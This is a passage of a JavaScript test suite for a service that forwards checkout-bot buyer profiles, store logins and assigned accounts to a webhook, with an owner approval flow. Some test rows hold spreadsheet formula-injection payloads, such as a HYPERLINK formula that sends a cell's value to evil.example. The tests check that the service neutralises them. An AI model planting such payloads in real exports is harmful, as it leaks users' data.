    assert.ok(m.content.includes("\n-# Per store: its profiles for AYCD (.json) and Shikari (.csv).\n"), m.content);
  });
  const slotHead = tgtCsv.split("\r\n")[0];
  await test("the Shikari CSV is written as Shikari writes it: plain values, codes, the phone's 10 digits, CRLF (2026-10-09)", async () => {
    const rows = [
      ["Lâm #1", "Lâm", "Nguyễn", "lam@example.com", "+1 (555) 010-0199", "4242 4242 4242 4242", "09", "31", "053", "12 Oak St, Apt 4", "", "St. Louis", "Missouri", "63101", "United States",
        "Lâm", "Nguyễn", "12 Oak St, Apt 4", "", "St. Louis", "mo", "63101", "usa"],
      ["Lou Ng", "Lou", "Ng", "lou@example.com", "555-010-0101", "5555555555554444", "1", "2030", "321", "9 Elm St", "Apt 2", "Toronto", "ON", "M5V 2T6", "CA",
        "Lou", "Ng", "1 Bay St", "", "Toronto", "Ontario", "M5J 2N8", "Canada"],
      ['=HYPERLINK("http://evil.example/")', "Ann", "One", "ann@example.com", "5550100", "4111111111111111", "12", "2029", "007", "-1 Main St", "", "@Austin", "TX", "78701", "",
        "Ann", "One", "+1 Main St", "", "Austin", "TX", "78701", "US"],
    ];
    const text = slotHead + "\r\n" + rows.map((r) => r.map(cellT).join(",")).join("\r\n");
    assert.equal((await slots("/submissions", frankKey, { files: [{ store: "Target", storeKey: "target", kind: "profiles", text }], name: "Lâm Nguyễn", slots: 3, batch: "sk" + rid() })).status, 200);
    const m = webhookPosts.at(-1);
    assert.deepEqual(m.files.map((f) => f.name), ["Lam-Nguyen-target-aycd.json", "Lam-Nguyen-target-shikari.csv"], "named after the buyer, with the accents taken off");
    assert.equal(shikariOf(m)[0].text, [slotHead,
      'Lâm #1,Lâm,Nguyễn,lam@example.com,5550100199,4242424242424242,9,2031,053,"12 Oak St, Apt 4",,St. Louis,MO,63101,US,Lâm,Nguyễn,"12 Oak St, Apt 4",,St. Louis,MO,63101,US',
      "Lou Ng,Lou,Ng,lou@example.com,5550100101,5555555555554444,1,2030,321,9 Elm St,Apt 2,Toronto,ON,M5V 2T6,CA,Lou,Ng,1 Bay St,,Toronto,ON,M5J 2N8,CA",
      '"HYPERLINK(""http://evil.example/"")",Ann,One,ann@example.com,5550100,4111111111111111,12,2029,007,1 Main St,,Austin,TX,78701,US,Ann,One,1 Main St,,Austin,TX,78701,US',
    ].join("\r\n") + "\r\n");
    for (const v of csvRows(shikariOf(m)[0].text).flat()) assert.ok(!/^[=+\-@]/.test(v), "nothing a spreadsheet would run: " + v);
    // No name sent: the buyer's Discord name.
    assert.equal((await slots("/submissions", frankKey, { files: [{ store: "Target", kind: "profiles", text: tgtCsv }], slots: 1, batch: "sk" + rid() })).status, 200);
    assert.deepEqual(webhookPosts.at(-1).files.map((f) => f.name), ["frank-target-aycd.json", "frank-target-shikari.csv"]);
  });
  await test("number cells in a posted CSV (app 1.9.52's) go out as Excel text, so the full card number and leading zeros show", async () => {
    const sent = slotHead + "\r\nAnn One,Ann,One,ann@example.com,+15550100,5555555555554444,09,2031,053,1 Main St,,Boston,MA,02139,US,Ann,One,1 Main St,,Boston,MA,02139,US";
    const r = await slots("/submissions", frankKey, { csv: sent, name: "Beta", slots: 1, batch: "xl" + rid() });
    assert.equal(r.status, 200);
    const got = plain(webhookPosts.at(-1))[0].text.split("\r\n");
    assert.equal(got[0], slotHead, "the header as sent");
    assert.equal(got[1], 'Ann One,Ann,One,ann@example.com,"=""+15550100""","=""5555555555554444""","=""09""",2031,"=""053""",1 Main St,,Boston,MA,"=""02139""",US,Ann,One,1 Main St,,Boston,MA,"=""02139""",US');
  });
  await test("a buyer's cell that starts with = + - or @ goes out as text, never as a formula", async () => {
    const evil = '=HYPERLINK("http://evil.example/?"&F2,"Click")', long = "=" + "x".repeat(600);
    const row = [evil, "Ann", "One", "ann@example.com", "5550100", "4242424242424242", "07", "2029", "123", "+1 Main St", "-", "@home", "TX", "78701", "US", "Ann", "One", long, "", "Austin", "TX", "78701", "US"];
    const r = await slots("/submissions", frankKey, { csv: slotHead + "\r\n" + row.map(cellT).join(","), name: "Beta", slots: 1, batch: "xl" + rid() });
    assert.equal(r.status, 200);
    const posted = csvRows(plain(webhookPosts.at(-1))[0].text)[1];
    assert.equal(posted[0], '="=HYPERLINK(""http://evil.example/?""&F2,""Click"")"');
    assert.deepEqual([posted[9], posted[10], posted[11]], ['="+1 Main St"', '="-"', '="@home"']);
    assert.match(posted[17], /^="=x{249}"&"x{250}"&"x{101}"$/, "a long one in parts of 250 at most, which Excel takes");
    assert.deepEqual(posted.map(shown), row, "Excel shows exactly what was typed");
    for (const v of posted) assert.ok(!/^[=+\-@]/.test(v) || EXCEL_STRINGS.test(v), "nothing that runs but plain strings: " + v);
  });
  const kimPlace = { name: "Kim Lee", email: "kim@example.com", phone: "5550100", line1: "1 Main St", line2: "", line3: "", postCode: "78701", city: "Austin", country: "United States", state: "Texas" };
  const kimAycd = { name: "Kim Lee", notes: "", billingAddress: kimPlace, shippingAddress: kimPlace,
    paymentDetails: { nameOnCard: "Kim Lee", cardType: "Visa", cardNumber: "4242424242424242", cardExpMonth: "07", cardExpYear: "2029", cardCvv: "123" },
    sameBillingAndShippingAddress: true, onlyCheckoutOnce: false, matchNameOnCardAndAddress: true };
  await test("each store's slots also go out as AYCD JSON, as AYCD exports it, made from the CSV for apps before 1.9.87", async () => {
    const files = [{ store: "Target", kind: "profiles", text: tgtCsv }, { store: "Walmart", kind: "profiles", text: wmCsv }];
    assert.equal((await slots("/submissions", frankKey, { files, name: "Beta", slots: 2, batch: "ay" + rid() })).status, 200);
    const m = webhookPosts.at(-1), [tgt, wm] = aycdOf(m);
    assert.equal(JSON.stringify(tgt), JSON.stringify([kimAycd]), "AYCD's keys in AYCD's order, the state and country written out");
    assert.equal(m.files[0].text, JSON.stringify([kimAycd], null, 2), "indented as AYCD writes it");
    assert.deepEqual([wm[0].name, wm[0].shippingAddress.name, wm[0].billingAddress.name, wm[0].paymentDetails.nameOnCard, wm[0].sameBillingAndShippingAddress],
      ["Sam Park", "Sam Park", "Kim Lee", "Kim Lee", false], "the billing name (this row's is Kim Lee) as the name on card");
  });
  await test("billing somewhere else, Canada, Mastercard and Amex, written out as AYCD does", async () => {
    const lou = ["Lou Ng", "Lou", "Ng", "lou@example.com", "5550101", "5555555555554444", "01", "2030", "321", "9 Elm St", "Apt 2", "Toronto", "ON", "M5V 2T6", "CA", "Lou", "Ng", "1 Bay St", "", "Toronto", "ON", "M5J 2N8", "CA"];
    const amy = ["Amy Ax", "Amy", "Ax", "amy@example.com", "5550102", "378282246310005", "11", "2031", "1234", "5 Oak Rd", "", "Reno", "NV", "89501", "US", "Amy", "Ax", "5 Oak Rd", "", "Reno", "NV", "89501", "US"];
    const text = slotHead + "\r\n" + [lou, amy].map((r) => r.map(cellT).join(",")).join("\r\n");
    assert.equal((await slots("/submissions", frankKey, { files: [{ store: "Target", kind: "profiles", text }], name: "Beta", slots: 2, batch: "ay" + rid() })).status, 200);
    const [[l, a]] = aycdOf(webhookPosts.at(-1));
    assert.deepEqual([l.sameBillingAndShippingAddress, l.shippingAddress.line2, l.shippingAddress.state, l.shippingAddress.country, l.billingAddress.line1, l.billingAddress.postCode],
      [false, "Apt 2", "Ontario", "Canada", "1 Bay St", "M5J 2N8"]);
    assert.deepEqual([l.paymentDetails.cardType, a.paymentDetails.cardType, a.paymentDetails.cardCvv, a.sameBillingAndShippingAddress, a.shippingAddress.state], ["MasterCard", "Amex", "1234", true, "Nevada"]);
  });
  await test("the app's own AYCD list (1.9.87+) goes out as sent, just before its store's logins", async () => {
    const mine = [{ ...kimAycd, paymentDetails: { ...kimAycd.paymentDetails, nameOnCard: "Kim Q Lee" }, onlyCheckoutOnce: true, matchNameOnCardAndAddress: false }];
    const files = [{ store: "Target", storeKey: "target", kind: "profiles", text: tgtCsv }, { store: "Target", storeKey: "target", kind: "aycd", text: JSON.stringify(mine) },
      { store: "Target", storeKey: "target", kind: "logins", text: "kim.target@example.com:pw" }];
    assert.equal((await slots("/submissions", frankKey, { files, name: "Beta", slots: 1, batch: "ay" + rid() })).status, 200);
    const m = webhookPosts.at(-1);
    assert.deepEqual(m.files.map((f) => f.name), ["Beta-target-aycd.json", "Beta-target-shikari.csv", "Beta-target-logins.txt"]);
    assert.equal(m.files[0].text, JSON.stringify(mine, null, 2));
  });
  await test("an AYCD list has to go with its store's CSV, one profile for each row", async () => {
    const tgt = { store: "Target", storeKey: "target", kind: "profiles", text: tgtCsv }, one = JSON.stringify([kimAycd]);
    const ay = (text, extra = {}) => ({ store: "Target", storeKey: "target", kind: "aycd", text, ...extra });
    for (const files of [
      [tgt, ay("[]")], [tgt, ay(JSON.stringify([kimAycd, kimAycd]))], [tgt, ay("{}")], [tgt, ay("not json")], [tgt, ay("[1]")], [tgt, ay("[[]]")],
      [tgt, ay(one), ay(one)], [tgt, ay(one, { store: "Walmart", storeKey: "walmart" })], [tgt, ay(one, { storeKey: "" })],
      [tgt, { ...tgt }, ay(one)],
    ]) assert.equal((await slots("/submissions", frankKey, { files, name: "Beta", slots: 1, batch: "ay" + rid() })).status, 400, JSON.stringify(files.map((f) => [f.kind, f.store, f.storeKey, f.text.slice(0, 12)])));
  });
  await test("per-store files need a store, a kind, some text, and at least one profiles CSV", async () => {
    for (const files of [
      [], [{ store: "Target", kind: "logins", text: "a@b.co:p" }],
      [{ store: "", kind: "profiles", text: tgtCsv }], [{ store: "Target", kind: "other", text: tgtCsv }],
      [{ store: "Target", kind: "profiles", text: "name,email\r\nKim,kim@example.com" }], [{ store: "Target", kind: "profiles", text: tgtCsv }, { store: "Target", kind: "logins", text: " " }],
      Array.from({ length: 61 }, (_, i) => ({ store: "Target " + i, kind: "profiles", text: tgtCsv })),
    ]) assert.equal((await slots("/submissions", frankKey, { files, slots: 1 })).status, 400, JSON.stringify(files).slice(0, 80));
  });
  await test("more than 10 files go out in follow-up messages", async () => {
    const before = webhookPosts.length;
    const files = [];
    for (let i = 0; i < 12; i++) files.push({ store: "Store " + i, kind: "profiles", text: tgtCsv }, { store: "Store " + i, kind: "logins", text: `a${i}@example.com:pw` });
    const r = await slots("/submissions", frankKey, { files, name: "Beta", slots: 12, batch: "many" + rid() });
    assert.equal(r.status, 200);
    const posts = webhookPosts.slice(before);
    assert.deepEqual(posts.map((m) => m.files.length), [10, 10, 10, 6], "three files a store: its AYCD list, its Shikari CSV and its logins");
    assert.ok(posts[0].content.startsWith("📦 **12 slots** from **Beta**"), posts[0].content);
    assert.equal(posts[1].content, `-# More files for the batch from **Beta** · @frank · license …${frankKey.slice(-4)} (11–20 of 36).`);
    assert.deepEqual(posts.flatMap((m) => plain(m).map((f) => f.text)), files.filter((f) => f.kind === "logins").map((f) => f.text), "every logins file, in order");
    assert.equal(posts.flatMap((m) => aycdOf(m)).length, 12, "and every store's AYCD list");
  });
  await test("if a follow-up message fails, the app is told, and sending again posts every file", async () => {
    const files = [];
    for (let i = 0; i < 6; i++) files.push({ store: "Shop " + i, kind: "profiles", text: tgtCsv }, { store: "Shop " + i, kind: "logins", text: `b${i}@example.com:pw` });
    const batch = "part" + rid(), before = webhookPosts.length;
    webhookFail.push(0, 500);
    assert.equal((await slots("/submissions", frankKey, { files, name: "Beta", slots: 6, batch })).status, 502);
    assert.equal(webhookPosts.length, before + 1, "the first part went out");
    assert.equal((await slots("/submissions", frankKey, { files, name: "Beta", slots: 6, batch })).status, 200);
    assert.deepEqual(webhookPosts.slice(before + 1).map((m) => m.files.length), [10, 8], "sent again in full");
  });
  console.log("\nApproving batches (2026-10-06; app 1.9.91+ shows it)");
  const approveLink = (content) => (content.match(/\[Approve or decline\]\((http[^)]+\/submissions\/review\/[^)]+)\)/) || [])[1];
  const approvePost = (link, action = "approve") => fetch(link.split("?")[0], { method: "POST", body: new URLSearchParams({ t: new URL(link).searchParams.get("t"), action }) });
  const statusOf = async (key, ids) => { const r = await slots("/submissions/status?ids=" + ids.join(","), key); return r.ok ? (await r.json()).batches : r.status; };
  let apBatch, apLink, apMsg;
  await test("each batch's message ends with an Approve link, and the app hears it's pending", async () => {
    apBatch = "appr" + rid();
    const files = [{ store: "Target", kind: "profiles", text: tgtCsv }, { store: "Target", kind: "logins", text: "kim.target@example.com:pw" }, { store: "Walmart", kind: "profiles", text: wmCsv }];
    const r = await (await slots("/submissions", frankKey, { files, name: "Beta <b>", slots: 2, batch: apBatch, stores: [{ name: "Target", n: 1 }, { name: "Walmart", n: 1, seller: 1 }] })).json();
    assert.deepEqual(r, { ok: true, id: apBatch, review: "pending" });
    apMsg = webhookPosts.at(-1); apLink = approveLink(apMsg.content);
    assert.ok(apLink && apMsg.content.endsWith(`\n⏳ **Pending your approval** · [Approve or decline](${apLink})`), apMsg.content);
    assert.match(apLink, new RegExp(`^${BASE}/submissions/review/${apBatch}\\?t=[A-Za-z0-9_-]{32}$`));
    assert.deepEqual(await statusOf(frankKey, [apBatch]), { [apBatch]: { status: "pending" } });
  });
  await test("only the license that sent a batch hears about it, and asking needs a license", async () => {
    assert.equal(await statusOf(null, [apBatch]), 401);
    assert.equal(await statusOf("PVLT-NOPE-NOPE-NOPE-NOPE", [apBatch]), 401);
    assert.deepEqual(await statusOf(GH_KEY, [apBatch]), {}, "another license gets nothing");
    assert.deepEqual(await statusOf(frankKey, ["unknown" + rid(), "bad id!", apBatch, apBatch]), { [apBatch]: { status: "pending" } }, "unknown and malformed ids are left out");
    assert.deepEqual(await statusOf(frankKey, []), {});
  });
  await test("the review page needs its token, shows the batch (never its slots), and changes nothing by itself", async () => {
    assert.equal((await fetch(apLink.replace(/t=[^&]+/, "t=nope"))).status, 404);
    assert.equal((await approvePost(apLink.replace(/t=[^&]+/, "t=nope"))).status, 404);
    assert.equal((await fetch(`${BASE}/submissions/review/nope?t=x`)).status, 404);
    const html = await (await fetch(apLink)).text();
    assert.match(html, /2 slots from Beta &lt;b&gt;/); assert.match(html, /Target 1 · Walmart 1 \(1 needs an account\)/);
    assert.match(html, /Waiting for you\./); assert.match(html, /Until then their FAFO shows these slots as Pending approval, and after, as Success\./); assert.match(html, /value="approve">Approve</); assert.match(html, /value="decline-ask">Decline</);
    assert.match(html, new RegExp(`Sent by Beta &lt;b&gt; · @frank · license …${frankKey.slice(-4)}, \\d{4}-\\d\\d-\\d\\d \\d\\d:\\d\\d UTC`));
    assert.doesNotMatch(html, /4242424242424242|kim\.target|Kim Lee/, "never the slots themselves");
    assert.deepEqual(await statusOf(frankKey, [apBatch]), { [apBatch]: { status: "pending" } });
  });
  await test("approving marks its message and tells the app, once", async () => {
    const edits = webhookEdits.length, t0 = Date.now();
    const html = await (await approvePost(apLink)).text();
    assert.match(html, /Approved\. Their FAFO now shows these slots as Success\./); assert.doesNotMatch(html, /value="approve"/);
    const st = (await statusOf(frankKey, [apBatch]))[apBatch];
    assert.equal(st.status, "approved"); assert.ok(st.at >= t0 && st.at <= Date.now(), JSON.stringify(st));
    await new Promise((ok) => setTimeout(ok, 300));
    assert.equal(webhookEdits.length, edits + 1);
    const e = webhookEdits.at(-1);
    assert.equal(e.id, apMsg.id);
    assert.equal(e.content, apMsg.content.replace(/\n⏳ [^\n]*$/, `\n✅ **Approved** <t:${Math.floor(st.at / 1000)}:f>`));
    assert.equal(e.allowed_mentions.parse.length, 0);
    assert.match(await (await approvePost(apLink)).text(), /Approved \d{4}-\d\d-\d\d \d\d:\d\d UTC\. Their FAFO shows these slots as Success\./, "approving again changes nothing");
    await new Promise((ok) => setTimeout(ok, 300));
    assert.equal(webhookEdits.length, edits + 1, "and the message isn't edited again");
    assert.deepEqual((await statusOf(frankKey, [apBatch]))[apBatch], st);
  });
  await test("sending an approved batch again says it's approved", async () => {
    const again = await (await slots("/submissions", frankKey, { files: [{ store: "Target", kind: "profiles", text: tgtCsv }], name: "Beta", slots: 2, batch: apBatch })).json();
    assert.equal(again.duplicate, true); assert.equal(again.review, "approved");
  });
  await test("a license lists its own batches (for apps before 1.9.91, which kept no batch id): when, how many, whose, decided", async () => {
    const list = async (key, q = "") => { const r = await slots("/submissions/batches" + q, key); return r.ok ? await r.json() : r.status; };
    assert.equal(await list(null), 401);
    assert.equal(await list("PVLT-NOPE-NOPE-NOPE-NOPE"), 401);
    const t0 = Date.now(), d = await list(frankKey);
    assert.ok(Math.abs(d.now - t0) < 60000, "the worker's clock, to set the app's against");
    const b = d.batches.find((x) => x.id === apBatch);
    assert.ok(b, "the approved batch is listed");
    assert.equal(b.slots, 2); assert.equal(b.name, "Beta <b>"); assert.equal(b.status, "approved");
    assert.ok(b.at > 0 && b.at <= b.decided && b.decided <= t0, JSON.stringify(b));
    assert.deepEqual(Object.keys(b).sort(), ["at", "decided", "id", "name", "slots", "status"], "nothing else: never the slots");
    assert.ok(d.batches.every((x, i) => !i || d.batches[i - 1].at <= x.at), "oldest first");
    assert.ok(d.batches.every((x) => x.status !== "pending" || !("decided" in x)), "a pending batch has no decided time");
    assert.ok(!(await list(GH_KEY)).batches.some((x) => x.id === apBatch), "another license never sees it");
    assert.ok(!(await list(frankKey, `?since=${b.at + 1}`)).batches.some((x) => x.id === apBatch), "since leaves out older ones");
    assert.ok(!(await list(frankKey, `?until=${b.at - 1}`)).batches.some((x) => x.id === apBatch), "until leaves out newer ones");
    assert.ok((await list(frankKey, `?since=${b.at}&until=${b.at}`)).batches.some((x) => x.id === apBatch), "both ends included");
  });
  await test("a batch that never reached the channel has nothing to approve; sending it again posts a new link", async () => {
    const batch = "apfail" + rid(), files = [{ store: "Target", kind: "profiles", text: tgtCsv }];
    webhookFail.push(500);
    assert.equal((await slots("/submissions", frankKey, { files, name: "Beta", slots: 1, batch })).status, 502);
    assert.deepEqual(await statusOf(frankKey, [batch]), {});
    assert.equal((await slots("/submissions", frankKey, { files, name: "Beta", slots: 1, batch })).status, 200);
    assert.deepEqual(await statusOf(frankKey, [batch]), { [batch]: { status: "pending" } });
    assert.ok(approveLink(webhookPosts.at(-1).content).includes(`/submissions/review/${batch}?t=`));
  });
  await test("a batch in several messages has its Approve link on the first", async () => {
    const before = webhookPosts.length, files = [];
    for (let i = 0; i < 6; i++) files.push({ store: "Mall " + i, kind: "profiles", text: tgtCsv }, { store: "Mall " + i, kind: "logins", text: `c${i}@example.com:pw` });
    assert.equal((await slots("/submissions", frankKey, { files, name: "Beta", slots: 6, batch: "apmany" + rid() })).status, 200);
    const posts = webhookPosts.slice(before);
    assert.equal(posts.length, 2); assert.ok(approveLink(posts[0].content)); assert.ok(!approveLink(posts[1].content));
  });
  await test("declining asks first, then marks its message and tells the app; either decision is final", async () => {
    const batch = "decl" + rid(), before = webhookPosts.length;
    assert.equal((await slots("/submissions", frankKey, { files: [{ store: "Target", kind: "profiles", text: tgtCsv }], name: "Beta", slots: 1, batch, stores: [{ name: "Target", n: 1 }] })).status, 200);
    const m = webhookPosts.slice(before).find((x) => x.content.startsWith("📦")), link = approveLink(m.content);
    const ask = await (await approvePost(link, "decline-ask")).text();
    assert.match(ask, /<h2>Decline these slots\?<\/h2>/); assert.match(ask, /Their FAFO will show these slots as Declined, and they can send them again\. This can't be undone\./);
    assert.match(ask, /value="decline">Decline</); assert.match(ask, /<form method="get"><input type="hidden" name="t" value="[A-Za-z0-9_-]{32}"><button[^>]*>Keep it waiting</);
    assert.doesNotMatch(ask, /value="approve"/, "only Decline or keep it waiting");
    assert.deepEqual(await statusOf(frankKey, [batch]), { [batch]: { status: "pending" } }, "asking changes nothing");
    const edits = webhookEdits.length, t0 = Date.now();
    const html = await (await approvePost(link, "decline")).text();
    assert.match(html, /Declined\. Their FAFO now shows these slots as Declined\.<\/p>/); assert.doesNotMatch(html, /value="(approve|decline-ask)"/);
    const st = (await statusOf(frankKey, [batch]))[batch];
    assert.equal(st.status, "declined"); assert.ok(st.at >= t0 && st.at <= Date.now(), JSON.stringify(st));
    await new Promise((ok) => setTimeout(ok, 300));
    assert.equal(webhookEdits.length, edits + 1);
    assert.equal(webhookEdits.at(-1).content, m.content.replace(/\n⏳ [^\n]*$/, `\n⛔ **Declined** <t:${Math.floor(st.at / 1000)}:f>`));
    for (const action of ["approve", "decline", "decline-ask"]) assert.match(await (await approvePost(link, action)).text(), /Declined \d{4}-\d\d-\d\d \d\d:\d\d UTC\. Their FAFO shows these slots as Declined\./);
    assert.match(await (await approvePost(apLink, "decline")).text(), /Approved \d{4}-\d\d-\d\d/, "an approved batch can't be declined");
    await new Promise((ok) => setTimeout(ok, 300));
    assert.equal(webhookEdits.length, edits + 1, "nothing edited again");
    assert.deepEqual((await statusOf(frankKey, [batch, apBatch])), { [batch]: st, [apBatch]: (await statusOf(frankKey, [apBatch]))[apBatch] });
    assert.equal((await statusOf(frankKey, [apBatch]))[apBatch].status, "approved");
    const again = await (await slots("/submissions", frankKey, { files: [{ store: "Target", kind: "profiles", text: tgtCsv }], name: "Beta", slots: 1, batch })).json();
    assert.equal(again.duplicate, true); assert.equal(again.review, "declined");
  });
  await test("admin lists whether each batch is approved, with its Approve link", async () => {
    const d = await (await admin("/admin/submissions")).json();
    const s = d.submissions.find((x) => x.id === apBatch);
    assert.equal(s.review, "approved"); assert.ok(s.decided_at > 0); assert.equal(s.review_url, apLink); assert.equal(s.review_token, undefined);
    assert.ok(d.submissions.every((x) => x.review_token === undefined));
  });
  console.log("\nAssigned accounts (app 1.9.58+)");
  let ginaKey, bobKey, reviewLink;
  const newKey = async (who) => { const r = rid(); await signIn(r, who); const st = await getJson("/discord/status/" + r); assert.equal(st.status, "issued"); return st.key; };
  const offerLink = (content) => (content.match(/\((http[^)]+\/accounts\/review\/[^)]+)\)/) || [])[1];
  const offerPost = (link, action) => fetch(link.split("?")[0], { method: "POST", body: new URLSearchParams({ t: new URL(link).searchParams.get("t"), action }) });
  const pool = Array.from({ length: 13 }, (_, i) => ({ email: `pool${i + 1}@outlook.com`, password: "Test-Pw-1!" }));
  const head = tgtCsv.split("\r\n")[0];
  const slotRow = (name, email) => `${name},${name.split(" ")[0]},${name.split(" ")[1]},${email},5550100,4242424242424242,07,2029,123,"1 Main St, Apt 2",,Austin,TX,78701,US,${name.split(" ")[0]},${name.split(" ")[1]},1 Main St,,Austin,TX,78701,US`;
  const slotCsv = (rows) => [head, ...rows].join("\r\n");
  // The account each row checks out with, from its store's AYCD list (the CSV isn't posted since 2026-10-06).
  const emailsOf = (list) => list.map((x) => x.shippingAddress.email);
  const accounts = async () => (await (await admin("/admin/accounts")).json());
  await test("two licenses for these tests", async () => { ginaKey = await newKey("gina"); bobKey = await newKey("bob"); });
  await test("sending accounts needs a license, a store and email:password pairs", async () => {
    assert.equal((await slots("/accounts/offer", null, { store: "target", accounts: pool })).status, 401);
    for (const body of [{ store: "", accounts: pool }, { store: "Target!", accounts: pool }, { store: "target", accounts: [] }, { store: "target" },
      { store: "target", accounts: [{ email: "nope", password: "x" }] }, { store: "target", accounts: [{ email: "a@b.co", password: "" }] },
      { store: "target", accounts: [{ email: "a@b.co", password: "line\nbreak" }] }])
      assert.equal((await slots("/accounts/offer", ginaKey, body)).status, 400, JSON.stringify(body).slice(0, 70));
  });
  await test("sent accounts wait for the owner: the channel gets the count and a review link, never the accounts", async () => {
    const before = webhookPosts.length;
    const r = await (await slots("/accounts/offer", ginaKey, { store: "target", storeName: "Target", name: "Owner", accounts: [...pool, { ...pool[0], email: "POOL1@outlook.com" }] })).json();
    assert.deepEqual(r, { status: "pending", count: 13 }, "a repeated email counts once");
    await new Promise((ok) => setTimeout(ok, 400));
    assert.equal(webhookPosts.length, before + 1);
    const m = webhookPosts.at(-1).content;
    assert.match(m, /Add 13 Target accounts to your list for Use Assigned Account\?/); assert.match(m, /Sent by \*\*Owner\*\* · @gina/);
    assert.doesNotMatch(m, /pool1@|Test-Pw-1/, "no emails or passwords in the channel");
    reviewLink = offerLink(m); assert.ok(reviewLink, m);
    const html = await (await fetch(reviewLink)).text();
    assert.match(html, /pool1@outlook\.com/); assert.doesNotMatch(html, /Test-Pw-1/, "the review page shows emails, never passwords");
    assert.equal((await fetch(reviewLink.replace(/t=[^&]+/, "t=wrong"))).status, 404);
  });
  await test("until the owner adds them, those slots wait for an account, and the AYCD profile goes as sent", async () => {
    const files = [{ store: "Target", storeKey: "target", kind: "profiles", text: slotCsv([slotRow("Ann One", "ann@example.com")]), assigned: 1 }];
    const r = await (await slots("/submissions", ginaKey, { files, name: "Gina", slots: 1, batch: "asg0" + rid(), stores: [{ name: "Target", n: 1, seller: 1 }] })).json();
    assert.deepEqual(r.accounts, { Target: { asked: 1, got: 0 } });
    const m = webhookPosts.at(-1);
    assert.match(m.content, /\nTarget 1 \(1 needs an account: your list has none\)\n/, "and why"); assert.match(m.content, /Profiles that need an account come last\.\n⏳ /);
    assert.deepEqual(plain(m), [], "no logins file"); assert.deepEqual(emailsOf(aycdOf(m)[0]), ["ann@example.com"], "the email as sent");
  });
  await test("adding them from the review link puts them on the list", async () => {
    assert.match(await (await offerPost(reviewLink, "add")).text(), /Added 13 to your list\./);
    await new Promise((ok) => setTimeout(ok, 300));
    const d = await accounts();
    assert.deepEqual(d.stores, [{ store: "target", total: 13, free: 13, sent: 0 }]); assert.equal(d.limit, 10);
    assert.match(webhookEdits.at(-1).content, /Added 13 Target accounts to your list/);
    assert.match(await (await offerPost(reviewLink, "refuse")).text(), /Added 13 to your list/, "decided: stays added");
    assert.equal(d.offers[0].status, "added"); assert.equal(d.offers[0].accounts, undefined, "the offer no longer holds them");
  });
  let first = [];
  await test("each slot on Use Assigned Account gets its own account: email in its row, email:password in the logins, same order", async () => {
    const files = [
      { store: "Target", storeKey: "target", kind: "profiles", text: slotCsv([slotRow("Kim Lee", "kim@example.com"), slotRow("Ann One", "ann@example.com"), slotRow("Bo Two", "bo@example.com"), slotRow("Cy Three", "cy@example.com")]), assigned: 2 },
      { store: "Target", kind: "logins", text: "kim.target@example.com:pa:ss" },
      { store: "Walmart", storeKey: "walmart", kind: "profiles", text: slotCsv([slotRow("Dee Four", "dee@example.com")]), assigned: 1 }];
    // Target's AYCD list from the app (1.9.87+); Walmart's is made from its CSV.
    const pl = (n, email) => ({ name: n, email, phone: "5550100" });
    files.splice(1, 0, { store: "Target", storeKey: "target", kind: "aycd", text: JSON.stringify(["Kim Lee", "Ann One", "Bo Two", "Cy Three"].map((n) => {
      const e = n.split(" ")[0].toLowerCase() + "@example.com"; return { name: n, notes: "", billingAddress: pl(n, e), shippingAddress: pl(n, e) }; })) });
    const r = await (await slots("/submissions", ginaKey, { files, name: "Gina", slots: 5, batch: "asg1" + rid(),
      stores: [{ name: "Target", n: 4, seller: 2 }, { name: "Walmart", n: 1, seller: 1 }] })).json();
    assert.deepEqual(r.accounts, { Target: { asked: 2, got: 2 }, Walmart: { asked: 1, got: 0 } });
    const m = webhookPosts.at(-1);
    assert.match(m.content, /\nTarget 4 \(2 assigned accounts\) · Walmart 1 \(1 needs an account: your list has none\)\n/);
    const [logF] = plain(m), [tA, wA] = aycdOf(m), em = emailsOf(tA);
    assert.deepEqual(plain(m).map((f) => f.name), ["Gina-target-logins.txt"], "Walmart has no logins file");
    assert.equal(em[0], "kim@example.com"); assert.equal(em[3], "cy@example.com", "other rows as sent");
    assert.ok(/^pool\d+@outlook\.com$/.test(em[1]) && /^pool\d+@outlook\.com$/.test(em[2]) && em[1] !== em[2], em);
    assert.equal(logF.text, `kim.target@example.com:pa:ss\r\n${em[1]}:Test-Pw-1!\r\n${em[2]}:Test-Pw-1!`);
    assert.deepEqual([emailsOf(wA), wA[0].shippingAddress.line1], [["dee@example.com"], "1 Main St, Apt 2"], "no Walmart list: as sent, quoted cells and all");
    assert.deepEqual(tA.map((x) => [x.billingAddress.email, x.shippingAddress.email]), [["kim@example.com", "kim@example.com"], [em[1], em[1]], [em[2], em[2]], ["cy@example.com", "cy@example.com"]],
      "the app's AYCD list gets the same accounts, row for row, on both addresses");
    assert.equal(wA[0].billingAddress.email, "dee@example.com", "Walmart's, made from its CSV, as sent");
    first = [em[1], em[2]];
    const d = await accounts();
    assert.deepEqual(d.stores, [{ store: "target", total: 13, free: 11, sent: 2 }]);
    assert.deepEqual(d.given.map((a) => [a.email, a.key_last4, a.profile, a.store_name]).sort(), [[em[1], ginaKey.slice(-4), "Ann One", "Target"], [em[2], ginaKey.slice(-4), "Bo Two", "Target"]].sort());
  });
  await test("a store with no logins file gets one for its accounts", async () => {
    const files = [{ store: "Target", storeKey: "target", kind: "profiles", text: slotCsv([slotRow("Eve Five", "eve@example.com")]), assigned: 1 }];
    const r = await (await slots("/submissions", ginaKey, { files, name: "Gina", slots: 1, batch: "asg2" + rid(), stores: [{ name: "Target", n: 1, seller: 1 }] })).json();
    assert.deepEqual(r.accounts, { Target: { asked: 1, got: 1 } });
    const m = webhookPosts.at(-1), e = emailsOf(aycdOf(m)[0])[0];
    assert.deepEqual(m.files.map((f) => f.name), ["Gina-target-aycd.json", "Gina-target-shikari.csv", "Gina-target-logins.txt"]);
    assert.equal(csvRows(shikariOf(m)[0].text)[1][3], e, "the Shikari CSV has it in the row's email column");
    assert.equal(plain(m)[0].text, `${e}:Test-Pw-1!`); assert.ok(!first.includes(e), "never one given out before");
    assert.ok(/^pool\d+@outlook\.com$/.test(e) && aycdOf(m)[0][0].billingAddress.email === e, "the AYCD profile made from the CSV has it, on both addresses");
    assert.doesNotMatch(m.content, /need an account/);
  });
  await test("a post that fails puts its accounts back; sending again picks again", async () => {
    const files = [{ store: "Target", storeKey: "target", kind: "profiles", text: slotCsv([slotRow("Fay Six", "fay@example.com")]), assigned: 1 }];
    const batch = "asg3" + rid(), before = (await accounts()).stores[0].free;
    webhookFail.push(500);
    assert.equal((await slots("/submissions", ginaKey, { files, name: "Gina", slots: 1, batch, stores: [{ name: "Target", n: 1, seller: 1 }] })).status, 502);
